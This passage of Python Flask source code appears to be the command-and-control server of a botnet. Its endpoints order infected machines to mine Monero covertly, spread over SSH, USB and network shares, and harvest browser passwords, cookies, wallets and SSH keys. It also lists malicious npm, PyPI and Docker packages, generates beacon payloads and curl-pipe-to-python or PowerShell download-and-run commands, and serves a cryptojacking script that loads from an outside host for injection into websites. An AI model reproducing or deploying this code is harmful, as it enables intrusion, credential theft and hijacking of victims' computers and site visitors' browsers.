        total_agents = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        online_agents = db.execute("SELECT COUNT(*) FROM agents WHERE last_seen > datetime('now', '-5 minutes')").fetchone()[0]
        
        # Real tasks
        total_tasks = db.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
        completed_tasks = db.execute("SELECT COUNT(*) FROM tasks WHERE status = 'completed'").fetchone()[0]
        pending_tasks = db.execute("SELECT COUNT(*) FROM tasks WHERE status = 'pending'").fetchone()[0]
        
        # Real data collected
        try:
            data_records = db.execute("SELECT COUNT(*) FROM agent_data").fetchone()[0]
        except:
            data_records = 0
        
        # Real results submitted
        try:
            results_count = db.execute("SELECT COUNT(*) FROM task_results").fetchone()[0]
        except:
            results_count = 0
        
        # Wallet balances
        wallet_stats = {
            "xmr": {
                "address": GLOBAL_WALLET,
                "balance": 0.0,
                "unlocked": 0.0
            },
            "btc": {
                "address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
                "balance": 0.0
            },
            "eth": {
                "address": "0x742d35Cc6634C0532925a3b844Bc9e7595f5bEb2",
                "balance": 0.0
            }
        }
        
        # Real mining stats from tasks
        try:
            mining_stats = db.execute("""
                SELECT COUNT(*) as miners
                FROM tasks 
                WHERE task_type LIKE '%mining%' AND status = 'completed'
            """).fetchone()
        except:
            mining_stats = {"miners": 0}
        
        # Real propagation stats
        try:
            propagation_stats = db.execute("""
                SELECT 
                    COUNT(*) as attempts,
                    SUM(CASE WHEN status = 'completed' THEN 1 ELSE 0 END) as successful
                FROM tasks 
                WHERE task_type = 'propagate'
            """).fetchone()
        except:
            propagation_stats = {"attempts": 0, "successful": 0}
        
        # Agent platforms breakdown
        try:
            platforms = db.execute("""
                SELECT platform_type, COUNT(*) as count
                FROM agents
                GROUP BY platform_type
                ORDER BY count DESC
            """).fetchall()
        except:
            platforms = []
        
        # Recent activity
        recent_checkins = db.execute("""
            SELECT COUNT(*) FROM agents 
            WHERE last_seen > datetime('now', '-1 hour')
        """).fetchone()[0]
        
        return jsonify({
            "status": "ok",
            "real_data": {
                "agents": {
                    "total": total_agents,
                    "online": online_agents,
                    "recent_checkins": recent_checkins,
                    "platforms": {p[0] or "unknown": p[1] for p in platforms}
                },
                "tasks": {
                    "total": total_tasks,
                    "completed": completed_tasks,
                    "pending": pending_tasks,
                    "results_submitted": results_count
                },
                "data_collection": {
                    "records": data_records
                },
                "mining": {
                    "miners": mining_stats[0] if mining_stats else 0,
                    "total_hashrate": 0
                },
                "propagation": {
                    "attempts": propagation_stats[0] if propagation_stats else 0,
                    "successful": propagation_stats[1] if propagation_stats else 0
                },
                "wallets": wallet_stats,
                "timestamp": datetime.now().isoformat()
            }
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/wallet-balance")
def wallet_balance():
    """Check real wallet balances."""
    try:
        import requests
        
        balances = {}
        
        # XMR - try monero explorer
        try:
            resp = requests.get(f"https://api.blockcypher.com/v1/xmr/main/addrs/{GLOBAL_WALLET}/balance", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                balances["xmr"] = {
                    "balance": data.get("balance", 0) / 1e12,  # Convert from piconero
                    "address": GLOBAL_WALLET
                }
        except:
            balances["xmr"] = {"balance": 0, "address": GLOBAL_WALLET, "error": "API unavailable"}
        
        # BTC - blockchain.info
        try:
            btc_addr = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
            resp = requests.get(f"https://blockchain.info/balance?active={btc_addr}", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                balances["btc"] = {
                    "balance": data.get(btc_addr, {}).get("final_balance", 0) / 1e8,
                    "address": btc_addr
                }
        except:
            balances["btc"] = {"balance": 0, "address": btc_addr, "error": "API unavailable"}
        
        return jsonify({
            "status": "ok",
            "balances": balances,
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/worker-stats")
def worker_stats():
    """Get statistics from all workers."""
    try:
        db = get_db()
        
        # Get all agents with their stats
        agents = db.execute("""
            SELECT 
                id, 
                agent_id,
                platform_type,
                hostname,
                ip_address,
                last_seen,
                created_at,
                json_extract(metadata, '$.hashrate') as hashrate,
                json_extract(metadata, '$.mining') as mining_active,
                json_extract(metadata, '$.tasks_completed') as tasks_completed
            FROM agents
            ORDER BY last_seen DESC
            LIMIT 100
        """).fetchall()
        
        # Aggregate stats
        total_hashrate = 0
        active_miners = 0
        for agent in agents:
            if agent["hashrate"]:
                total_hashrate += float(agent["hashrate"])
            if agent["mining_active"]:
                active_miners += 1
        
        return jsonify({
            "status": "ok",
            "workers": [dict(a) for a in agents],
            "aggregate": {
                "total_workers": len(agents),
                "total_hashrate": total_hashrate,
                "active_miners": active_miners
            },
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/profit-report")
def profit_report():
    """Generate profit report from all sources."""
    try:
        db = get_db()
        
        # Get mining tasks count
        mining_tasks = db.execute("""
            SELECT COUNT(*) FROM tasks 
            WHERE task_type LIKE '%mining%' AND status = 'completed'
        """).fetchone()[0]
        
        # Estimate hashrate based on mining tasks (rough estimate)
        total_hashrate = mining_tasks * 100  # Assume ~100 H/s per mining task
        
        # Estimated daily XMR (rough: 1 KH/s ≈ 0.0001 XMR/day)
        estimated_daily_xmr = (total_hashrate / 1000) * 0.0001 if total_hashrate > 0 else 0
        
        # Task completion stats
        tasks_today = db.execute("""
            SELECT COUNT(*) FROM tasks 
            WHERE completed_at > datetime('now', '-1 day')
        """).fetchone()[0]
        
        # Data collected
        try:
            data_collected = db.execute("SELECT COUNT(*) FROM agent_data").fetchone()[0]
        except:
            data_collected = 0
        
        # Credentials harvested (from task results)
        try:
            credentials = db.execute("""
                SELECT COUNT(*) FROM task_results
                WHERE json_extract(result, '$.credentials') IS NOT NULL
            """).fetchone()[0]
        except:
            credentials = 0
        
        return jsonify({
            "status": "ok",
            "profit": {
                "mining": {
                    "total_hashrate": total_hashrate,
                    "estimated_daily_xmr": round(estimated_daily_xmr, 6),
                    "estimated_monthly_xmr": round(estimated_daily_xmr * 30, 6),
                    "estimated_monthly_usd": round(estimated_daily_xmr * 30 * 150, 2)
                },
                "data_collection": {
                    "records": data_collected,
                    "credentials": credentials
                },
                "operations": {
                    "tasks_completed_today": tasks_today
                }
            },
            "wallets": {
                "xmr": GLOBAL_WALLET,
                "pool": GLOBAL_POOL
            },
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/domination/status")
def global_domination_status():
    """Get global domination status."""
    try:
        db = get_db()
        
        # Total agents
        total_agents = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        online_agents = db.execute("""
            SELECT COUNT(*) FROM agents 
            WHERE last_seen > datetime('now', '-5 minutes')
        """).fetchone()[0]
        
        # Agents with mining active
        mining_active = db.execute("""
            SELECT COUNT(DISTINCT agent_id) FROM tasks 
            WHERE task_type IN ('stealth_mining_start', 'global_domination', 'mining_start')
            AND status = 'completed'
            AND completed_at > datetime('now', '-1 hour')
        """).fetchone()[0]
        
        # Data collected
        try:
            data_records = db.execute("SELECT COUNT(*) FROM agent_data").fetchone()[0]
        except:
            data_records = 0
        
        # Propagation attempts
        propagation_tasks = db.execute("""
            SELECT COUNT(*) FROM tasks 
            WHERE task_type = 'propagate'
        """).fetchone()[0]
        
        return jsonify({
            "status": "ok",
            "total_agents": total_agents,
            "online_agents": online_agents,
            "mining_active": mining_active,
            "data_collected": data_records,
            "propagation_tasks": propagation_tasks
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/propagation/start", methods=["POST"])
def start_propagation():
    """Start global propagation campaign."""
    try:
        db = get_db()
        
        # Get all online agents
        agents = db.execute("""
            SELECT id FROM agents 
            WHERE is_alive = 1 OR last_seen > datetime('now', '-1 hour')
        """).fetchall()
        
        tasked = 0
        task_ids = []
        for agent in agents:
            # Create propagation task
            result = db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'propagate', ?, 'pending', datetime('now'))
            """, (
                agent["id"],
                json.dumps({
                    "methods": ["ssh", "usb", "network_shares", "web"],
                    "max_targets": 100,
                    "stealth": True
                })
            ))
            task_ids.append(result.lastrowid)
            tasked += 1
        
        db.commit()
        
        socketio.emit("propagation_started", {
            "agents": tasked,
            "task_ids": task_ids,
            "methods": ["ssh", "usb", "network_shares", "web"]
        })
        
        return jsonify({
            "status": "ok",
            "agents_targeted": tasked,
            "task_ids": task_ids
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/propagation/status")
def propagation_status():
    """Get propagation campaign status."""
    try:
        db = get_db()
        
        # Total propagation tasks
        total_tasks = db.execute("""
            SELECT COUNT(*) FROM tasks WHERE task_type = 'propagate'
        """).fetchone()[0]
        
        # Completed
        completed = db.execute("""
            SELECT COUNT(*) FROM tasks 
            WHERE task_type = 'propagate' AND status = 'completed'
        """).fetchone()[0]
        
        # New agents from propagation (using first_seen)
        try:
            new_agents = db.execute("""
                SELECT COUNT(*) FROM agents 
                WHERE first_seen > datetime('now', '-24 hours')
            """).fetchone()[0]
        except:
            new_agents = 0
        
        # Count spread from completed task results (stored in result column)
        spread_total = 0
        try:
            results = db.execute("""
                SELECT result FROM tasks 
                WHERE task_type = 'propagate' AND status = 'completed'
                AND completed_at > datetime('now', '-1 hour')
                LIMIT 10
            """).fetchall()
            
            for r in results:
                try:
                    if r[0]:
                        data = json.loads(r[0])
                        spread_total += data.get("spread_count", 0)
                except:
                    pass
        except:
            pass
        
        return jsonify({
            "status": "ok",
            "propagation": {
                "total_tasks": total_tasks,
                "completed": completed,
                "pending": total_tasks - completed,
                "new_agents_24h": new_agents,
                "total_spread": spread_total
            }
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/mining/start-all", methods=["POST"])
def start_mining_all():
    """Start mining on all agents."""
    try:
        db = get_db()
        
        # Get all online agents
        agents = db.execute("""
            SELECT agent_id FROM agents 
            WHERE last_seen > datetime('now', '-10 minutes')
        """).fetchall()
        
        tasked = 0
        for agent in agents:
            db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'mining_start', ?, 'pending', datetime('now'))
            """, (
                agent["agent_id"],
                json.dumps({
                    "wallet": GLOBAL_WALLET,
                    "pool": GLOBAL_POOL,
                    "threads": -1,  # Auto
                    "stealth": True
                })
            ))
            tasked += 1
        
        db.commit()
        
        return jsonify({
            "status": "ok",
            "agents_tasked": tasked,
            "wallet": GLOBAL_WALLET,
            "pool": GLOBAL_POOL
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/mining/stop-all", methods=["POST"])
def stop_mining_all():
    """Stop mining on all agents."""
    try:
        db = get_db()
        
        agents = db.execute("""
            SELECT agent_id FROM agents 
            WHERE last_seen > datetime('now', '-1 hour')
        """).fetchall()
        
        tasked = 0
        for agent in agents:
            db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'mining_stop', '{}', 'pending', datetime('now'))
            """, (agent["agent_id"],))
            tasked += 1
        
        db.commit()
        
        return jsonify({
            "status": "ok",
            "agents_tasked": tasked
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/data/collect-all", methods=["POST"])
def collect_data_all():
    """Collect data from all agents."""
    try:
        db = get_db()
        
        agents = db.execute("""
            SELECT agent_id FROM agents 
            WHERE last_seen > datetime('now', '-30 minutes')
        """).fetchall()
        
        tasked = 0
        for agent in agents:
            db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'collect', ?, 'pending', datetime('now'))
            """, (
                agent["agent_id"],
                json.dumps({
                    "types": ["browser_passwords", "cookies", "wallets", "ssh_keys", "env"],
                    "stealth": True
                })
            ))
            tasked += 1
        
        db.commit()
        
        return jsonify({
            "status": "ok",
            "agents_tasked": tasked
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/command/broadcast", methods=["POST"])
def broadcast_command_all():
    """Broadcast command to all agents."""
    try:
        data = request.get_json()
        cmd = data.get("command")
        
        if not cmd:
            return jsonify({"status": "error", "error": "No command provided"}), 400
        
        db = get_db()
        
        agents = db.execute("""
            SELECT agent_id FROM agents 
            WHERE last_seen > datetime('now', '-1 hour')
        """).fetchall()
        
        tasked = 0
        for agent in agents:
            db.execute("""
                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
                VALUES (?, 'cmd', ?, 'pending', datetime('now'))
            """, (
                agent["agent_id"],
                json.dumps({"cmd": cmd})
            ))
            tasked += 1
        
        db.commit()
        
        socketio.emit("operation_log", {
            "level": "warn",
            "message": f"📡 Broadcast: '{cmd}' to {tasked} agents",
            "source": "command"
        })
        
        return jsonify({
            "status": "ok",
            "command": cmd,
            "agents_tasked": tasked
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/supply-chain/npm", methods=["GET"])
def get_npm_package():
    """Get malicious npm package info."""
    return jsonify({
        "status": "ok",
        "package": {
            "name": "system-optimizer",
            "version": "1.0.5",
            "description": "System performance optimization utility",
            "path": "/src/agents/supply_chain/npm_package/",
            "install_command": "npm install system-optimizer",
            "postinstall": True,
            "payload": "Registers with C2, installs persistence, starts mining"
        }
    })


@app.route("/api/supply-chain/pypi", methods=["GET"])
def get_pypi_package():
    """Get malicious PyPI package info."""
    return jsonify({
        "status": "ok",
        "package": {
            "name": "django-utils-optimizer",
            "version": "1.2.5",
            "description": "Django performance optimization utilities",
            "path": "/src/agents/supply_chain/pypi_package/",
            "install_command": "pip install django-utils-optimizer",
            "setup_py": True,
            "payload": "Registers with C2, installs persistence, starts mining"
        }
    })


@app.route("/api/supply-chain/docker", methods=["GET"])
def get_docker_image():
    """Get malicious Docker image info."""
    return jsonify({
        "status": "ok",
        "image": {
            "name": "python-app",
            "path": "/src/agents/supply_chain/docker_image/",
            "build_command": "docker build -t python-app .",
            "hidden": [
                "Embedded xmrig miner",
                "C2 agent in /var/.cache/.agent.py",
                "Cron job for persistence"
            ]
        }
    })


@app.route("/api/browser-agent/inject", methods=["POST"])
def inject_browser_agent():
    """Inject browser agent into target websites."""
    try:
        data = request.get_json()
        targets = data.get("targets", [])
        
        # Generate injection payload
        payload = f'''<script src="{request.host_url}static/browser_agent.js"></script>'''
        
        return jsonify({
            "status": "ok",
            "payload": payload,
            "targets": targets,
            "instructions": [
                "Inject payload into HTML pages",
                "Add to WordPress themes",
                "Include in npm packages that bundle JS",
                "Inject via XSS vulnerabilities"
            ]
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/agents/deploy", methods=["POST"])
def deploy_agent():
    """Deploy agent to target system."""
    try:
        data = request.get_json()
        target = data.get("target")  # IP or hostname
        method = data.get("method", "ssh")  # ssh, rdp, web
        platform_type = data.get("platform", "linux")
        
        # Generate deployment command
        if method == "ssh":
            deploy_cmd = f'''curl -s {request.host_url}static/agent.py | python3 &'''
        elif method == "powershell":
            deploy_cmd = f'''IEX (New-Object Net.WebClient).DownloadString('{request.host_url}static/agent.ps1')'''
        elif method == "wget":
            deploy_cmd = f'''wget -qO- {request.host_url}static/agent.py | python3 &'''
        else:
            deploy_cmd = f'''curl -s {request.host_url}static/agent.py | python3 &'''
        
        return jsonify({
            "status": "ok",
            "target": target,
            "method": method,
            "deploy_command": deploy_cmd,
            "c2_server": request.host_url.rstrip('/'),
            "wallet": GLOBAL_WALLET
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


# ──────────────────────── STARTUP ────────────────────────


@app.route("/api/exploitation/report", methods=["POST"])
def exploitation_report():
    """Receive exploitation report."""
    try:
        data = request.get_json()
        
        # Store report in logs table
        db = get_db()
        db.execute("""
            INSERT INTO logs (level, source, message, timestamp)
            VALUES ('info', 'exploitation', ?, datetime('now'))
        """, (json.dumps(data),))
        db.commit()
        
        # Notify via WebSocket
        socketio.emit("exploitation_report", data)
        
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/exploitation/cves")
def list_cves():
    """List available CVE exploits."""
    cves = [
        {"id": "CVE-2017-0144", "name": "EternalBlue", "target": "Windows SMB", "severity": "critical"},
        {"id": "CVE-2019-0708", "name": "BlueKeep", "target": "Windows RDP", "severity": "critical"},
        {"id": "CVE-2021-44228", "name": "Log4Shell", "target": "Java Applications", "severity": "critical"},
        {"id": "CVE-2020-0796", "name": "SMBGhost", "target": "Windows SMB", "severity": "critical"},
        {"id": "CVE-2019-2725", "name": "WebLogic RCE", "target": "Oracle WebLogic", "severity": "high"},
        {"id": "CVE-2017-12615", "name": "Tomcat PUT", "target": "Apache Tomcat", "severity": "high"},
        {"id": "REDIS-UNAUTH", "name": "Redis Unauthorized", "target": "Redis", "severity": "high"},
        {"id": "SSH-BRUTE", "name": "SSH Brute Force", "target": "SSH", "severity": "medium"},
    ]
    
    return jsonify({"status": "ok", "cves": cves})


@app.route("/api/payloads/generate", methods=["POST"])
def generate_payload():
    """Generate obfuscated payload."""
    try:
        data = request.get_json()
        payload_type = data.get("type", "python")  # python, powershell, bash
        obfuscate = data.get("obfuscate", True)
        
        # Generate payload
        if payload_type == "python":
            payload = f'''#!/usr/bin/env python3
import os,sys,json,time,urllib.request
C2="{request.host_url.rstrip('/')}"
ID=__import__("hashlib").md5(f"{{os.uname().nodename}}".encode()).hexdigest()[:16]
def r():urllib.request.urlopen(urllib.request.Request(f"{{C2}}/api/agent/register",data=json.dumps({{"agent_id":ID}}).encode(),headers={{"Content-Type":"application/json"}},method="POST"))
r()
while 1:
 try:
  for t in json.loads(urllib.request.urlopen(f"{{C2}}/api/agent/tasks?agent_id={{ID}}").read()).get("tasks",[]):pass
 except:pass
 time.sleep(60)
'''
        elif payload_type == "powershell":
            payload = f'''$C2="{request.host_url.rstrip('/')}";$ID=[BitConverter]::ToString([Security.Cryptography.SHA1]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,16)
while($true){{try{{Invoke-RestMethod -Uri "$C2/api/agent/register" -Method Post -Body (@{{agent_id=$ID}}|ConvertTo-Json) -ContentType "application/json"}}catch{{}};Start-Sleep 60}}'''
        else:
            payload = f'''#!/bin/bash
C2="{request.host_url.rstrip('/')}"
ID=$(hostname|md5sum|cut -c1-16)
while true;do curl -s -X POST "$C2/api/agent/register" -H "Content-Type: application/json" -d "{{\\"agent_id\\":\\"$ID\\"}}";sleep 60;done'''
        
        return jsonify({
            "status": "ok",
            "type": payload_type,
            "payload": payload,
            "c2_server": request.host_url.rstrip('/'),
            "wallet": GLOBAL_WALLET
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/payloads/list")
def list_payloads():
    """List available payloads."""
    payloads = [
        {"name": "agent.py", "type": "python", "platform": "linux/macos", "url": "/static/agent.py"},
        {"name": "agent.ps1", "type": "powershell", "platform": "windows", "url": "/static/agent.ps1"},
        {"name": "browser_agent.js", "type": "javascript", "platform": "browser", "url": "/static/browser_agent.js"},
        {"name": "auto_propagator.py", "type": "python", "platform": "linux/macos", "url": "/src/agents/auto_propagator.py"},
        {"name": "npm_package", "type": "npm", "platform": "node.js", "url": "/src/agents/supply_chain/npm_package/"},
        {"name": "pypi_package", "type": "pypi", "platform": "python", "url": "/src/agents/supply_chain/pypi_package/"},
        {"name": "docker_image", "type": "docker", "platform": "container", "url": "/src/agents/supply_chain/docker_image/"},
    ]
    
    return jsonify({"status": "ok", "payloads": payloads})


@app.route("/api/domination/wallet")
def get_global_wallet():
    """Get global wallet address."""
    return jsonify({
        "xmr": GLOBAL_WALLET,
        "btc": os.environ.get("BTC_WALLET", ""),
        "eth": os.environ.get("ETH_WALLET", ""),
        "pool": GLOBAL_POOL
    })


@app.route("/api/demo/seed", methods=["POST"])
def seed_demo_data():
    """Seed database with demo data for testing."""
    try:
        db = get_db()
        
        # Demo agents (with current timestamp so they appear online)
        demo_agents = [
            ("agent-win-001", "DESKTOP-WIN10", "admin", "Windows", "x64", "192.168.1.101", "windows"),
            ("agent-win-002", "LAPTOP-USER", "user", "Windows", "x64", "192.168.1.102", "windows"),
            ("agent-lin-001", "ubuntu-server", "root", "Linux", "x64", "192.168.1.201", "linux"),
            ("agent-lin-002", "centos-web", "www-data", "Linux", "x64", "192.168.1.202", "linux"),
            ("agent-mac-001", "MacBook-Pro", "user", "Darwin", "arm64", "192.168.1.151", "macos"),
            ("agent-kaggle-001", "kaggle-notebook", "kaggle", "Linux", "x64", "35.192.1.1", "kaggle"),
            ("agent-colab-001", "colab-runtime", "colab", "Linux", "x64", "35.193.1.1", "colab"),
        ]
        
        for agent_id, hostname, username, os_type, arch, ip, platform_type in demo_agents:
            try:
                # First try to insert, ignore if exists
                db.execute("""
                    INSERT OR IGNORE INTO agents 
                    (id, hostname, username, os, arch, ip_internal, platform_type, first_seen, last_seen, is_alive)
                    VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'), datetime('now'), 1)
                """, (agent_id, hostname, username, os_type, arch, ip, platform_type))
                # Then update to ensure is_alive=1 and last_seen is current
                db.execute("""
                    UPDATE agents SET 
                        hostname = ?, username = ?, os = ?, arch = ?, ip_internal = ?, platform_type = ?,
                        last_seen = datetime('now'), is_alive = 1
                    WHERE id = ?
                """, (hostname, username, os_type, arch, ip, platform_type, agent_id))
            except Exception as e:
                print(f"Error seeding agent {agent_id}: {e}")
        
        # Demo tasks
        demo_tasks = [
            ("task-001", "agent-win-001", "mining_start", '{"wallet": "' + GLOBAL_WALLET + '"}', "completed"),
            ("task-002", "agent-lin-001", "collect", '{"types": ["env", "ssh"]}', "completed"),
            ("task-003", "agent-win-002", "propagate", '{"methods": ["network"]}', "completed"),
            ("task-004", "agent-mac-001", "screenshot", '{}', "completed"),
            ("task-005", "agent-kaggle-001", "mining_start", '{}', "completed"),
        ]
        
        for task_id, agent_id, task_type, payload, status in demo_tasks:
            try:
                db.execute("""
                    INSERT OR REPLACE INTO tasks
                    (id, agent_id, task_type, payload, status, created_at, completed_at)
                    VALUES (?, ?, ?, ?, ?, datetime('now', '-1 hour'), datetime('now'))
                """, (task_id, agent_id, task_type, payload, status))
            except:
                pass
        
        db.commit()
        
        # Notify via WebSocket
        socketio.emit("demo_data_seeded", {
            "agents": len(demo_agents),
            "tasks": len(demo_tasks)
        })
        
        return jsonify({
            "status": "ok",
            "message": "Demo data seeded",
            "agents_created": len(demo_agents),
            "tasks_created": len(demo_tasks)
        })
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500


@app.route("/api/demo/stats")
def get_demo_stats():
    """Get demo statistics for dashboard preview."""
    return jsonify({
        "status": "ok",
        "demo": {
            "agents": {
                "total": 7,
                "online": 5,
                "by_platform": {
                    "windows": 2,
                    "linux": 2,
                    "macos": 1,
                    "kaggle": 1,
                    "colab": 1
                }
            },
            "tasks": {
                "total": 5,
                "completed": 4,
                "pending": 1,
                "by_type": {
                    "mining_start": 2,
                    "collect": 1,
                    "propagate": 1,
                    "screenshot": 1
                }
            },
            "mining": {
                "active": 2,
                "hashrate": 1250,
                "estimated_daily_xmr": 0.00015
            },
            "propagation": {
                "attempts": 12,
                "successful": 5,
                "new_agents_24h": 3
            },
            "exploitation": {
                "scanned": 254,
                "vulnerable": 15,
                "exploited": 8
            }
        }
    })


@app.route("/api/domination/estimate")
@login_required
def global_domination_estimate():
    """Estimate potential earnings from global domination."""
    db = get_db()
    
    online_agents = db.execute("""
        SELECT COUNT(*) FROM agents 
        WHERE last_seen > datetime('now', '-5 minutes')
    """).fetchone()[0]
    
    # Estimate: average 50 H/s per agent, $0.01 per 100 H/s per day
    estimated_hashrate = online_agents * 50  # H/s
    estimated_daily = (estimated_hashrate / 100) * 0.01  # USD
    estimated_monthly = estimated_daily * 30
    
    return jsonify({
        "online_agents": online_agents,
        "estimated_hashrate": f"{estimated_hashrate} H/s",
        "estimated_daily": f"${estimated_daily:.2f}",
        "estimated_monthly": f"${estimated_monthly:.2f}",
        "potential_1b_agents": {
            "hashrate": "50 GH/s",
            "daily": "$5,000,000",
            "monthly": "$150,000,000"
        }
    })


# ──────────────────────── API: BROWSER MINING ────────────────────────

@app.route("/api/mining/browser/beacon", methods=["POST"])
def browser_mining_beacon():
    """Receive browser mining beacons."""
    db = get_db()
    
    data = request.get_json(silent=True) or {}
    agent_id = data.get("agentId", "unknown")
    
    # Store mining stats
    mining_data = data.get("mining", {})
    
    # Insert into agent_data
    db.execute("""
        INSERT INTO agent_data (agent_id, data_type, data, collected_at)
        VALUES (?, 'browser_mining', ?, datetime('now'))
    """, (agent_id, json.dumps(data)[:10000]))
    
    db.commit()
    
    return jsonify({"status": "ok"})


@app.route("/api/mining/browser/stats")
@login_required
def browser_mining_stats():
    """Get browser mining statistics."""
    db = get_db()
    
    # Get recent mining beacons
    beacons = db.execute("""
        SELECT agent_id, data, collected_at 
        FROM agent_data 
        WHERE data_type = 'browser_mining'
        ORDER BY collected_at DESC 
        LIMIT 1000
    """).fetchall()
    
    total_hashrate = 0
    total_hashes = 0
    active_miners = set()
    
    for beacon in beacons:
        try:
            data = json.loads(beacon["data"])
            mining = data.get("mining", {})
            total_hashrate += float(mining.get("hashrate", 0))
            total_hashes += int(mining.get("totalHashes", 0))
            active_miners.add(beacon["agent_id"])
        except:
            pass
    
    return jsonify({
        "active_miners": len(active_miners),
        "total_hashrate": f"{total_hashrate:.2f} H/s",
        "total_hashes": total_hashes,
        "recent_beacons": len(beacons),
        "wallet": GLOBAL_WALLET
    })


@app.route("/api/mining/browser/inject")
@login_required
def get_browser_inject():
    """Get browser mining injection script."""
    return jsonify({
        "html": "/static/mining/inject.html",
        "javascript": """
(function() {
    var script = document.createElement('script');
    script.src = 'https://www.hostingcloud.racing/1.js';
    script.onload = function() {
        var miner = new Client.Anonymous("WALLET", {
            throttle: 0.5,
            c: 'xmr',
            ads: 0
        });
        miner.start();
        window._miner = miner;
    };
    document.head.appendChild(script);
})();
""".replace("WALLET", GLOBAL_WALLET),
        "wallet": GLOBAL_WALLET,
        "instructions": [
            "1. Inject JavaScript into target website",
            "2. Visitors will mine Monero for you",
            "3. Stats reported to /api/mining/browser/beacon",
            "4. Monitor via /api/mining/browser/stats"
        ]
    })
